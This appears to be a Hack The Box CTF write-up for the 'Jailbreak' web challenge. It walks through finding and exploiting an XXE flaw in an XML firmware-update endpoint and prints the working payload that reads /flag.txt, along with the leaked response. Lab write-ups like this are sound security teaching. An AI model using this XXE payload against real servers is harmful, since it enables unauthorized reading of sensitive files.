---
title: Jailbreak - Hack The Box
date: 2024-12-27
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# Jailbreak

![Jailbreak - thumbnail](/ctf/hack-the-box/challenges/web/jailbreak/thumbnail.gif){style="width: 200px; height: 300px; display: block; margin: 0 auto;"}

## Challenge Description

The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily
guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device.

## Challenge Overview

This challenge simulates the **Fallout Pip-Boy** interface, providing various interactive pages such as Stats,
Inventory, Data, Map, Radio, and Rom. The focus of this challenge is the **Rom** page, where the application accepts XML
data to simulate a firmware update.

![Jailbreak - Overview](/ctf/hack-the-box/challenges/web/jailbreak/overview.png)

## Enumeration

### Initial Observation

On the **Rom** page, users can upload XML data for a firmware update. When XML data is submitted, the server processes
it and returns a success message indicating the initiation of the firmware update.

Example XML payload:

```xml

<FirmwareUpdateConfig>
    <Firmware>
        <Version>3.0</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
</FirmwareUpdateConfig>
```

### Server Response

Upon sending the above payload, the server returns the following JSON response:

```json
{
    "message": "Firmware version 3.0 update initiated."
}
```

#### Behavior Analysis

- The `Version` tag value from the XML payload is directly reflected in the response message.
- This behavior suggests the application parses the XML and uses its content dynamically in the response, making it a
  candidate for **XXE injection**.

## Exploitation: XML External Entity (XXE) Injection

The application processes user-supplied XML without sanitization, making it vulnerable to XXE. By crafting a malicious
payload, we can instruct the server to read sensitive files such as `/flag.txt`.

### Crafting the XXE Payload

To exploit the XXE vulnerability, we inject an external entity that points to the `/flag.txt` file. The `<Version>` tag
is used as the injection point to return the file's content in the server's response.

Malicious XML payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///flag.txt">
    ]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
    </Firmware>
</FirmwareUpdateConfig>
```

### Payload Explanation

1. **Document Type Declaration (DTD):**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///flag.txt">
   ]>
   ```
    - Defines an external entity `xxe` pointing to the file `/flag.txt`.

2. **Entity Injection:**
   ```xml
   <Version>&xxe;</Version>
   ```
    - References the `xxe` entity in the `<Version>` tag.

3. **Server Behavior:**
    - The server parses the XML payload, resolves the `xxe` entity, and includes the content of `/flag.txt` in the
      response.

### Retrieving the Flag

Upon sending the XXE payload to the server, the response includes the contents of the `/flag.txt` file within the
`message` field:

```json
{
    "message": "Firmware version HTB{f4k3_fl4g} update initiated."
}
```

We successfully exploited the XXE vulnerability to retrieve the flag! 🎉

<ChallengeCard 
    challengeType="web" 
    challengeName="Jailbreak"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/728"
/>

## References

- [OWASP - XML External Entity (XXE)](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_(XXE))
- [PortSwigger - What is XXE?](https://portswigger.net/web-security/xxe)
- [XML DTD and Entities](https://www.w3.org/TR/REC-xml/#sec-prolog-dtd)
